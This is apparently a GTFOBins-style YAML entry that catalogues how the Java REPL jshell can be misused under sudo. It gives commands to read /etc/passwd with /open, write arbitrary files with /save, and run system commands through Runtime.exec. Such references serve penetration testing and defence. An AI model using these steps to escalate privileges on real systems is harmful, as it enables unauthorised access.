---
comment: |-
  jshell is the Java REPL. It can be abused to read and write files using its built-in commands.
functions:
  file-read:
  - code: |-
      jshell
      jshell> /open /etc/passwd
    contexts:
      sudo:
        comment: |-
          Use /open to read arbitrary files into the REPL.
  file-write:
  - code: |-
      jshell
      jshell> int x = 42;
      jshell> /save /tmp/pwned.txt
    contexts:
      sudo:
        comment: |-
          Use /save to write REPL contents into arbitrary files.
  shell:
  - code: |-
      jshell
      jshell> Runtime.getRuntime().exec("/bin/sh -c id");
    contexts:
      sudo:
        comment: |-
          Execute arbitrary system commands via Java Runtime.
...
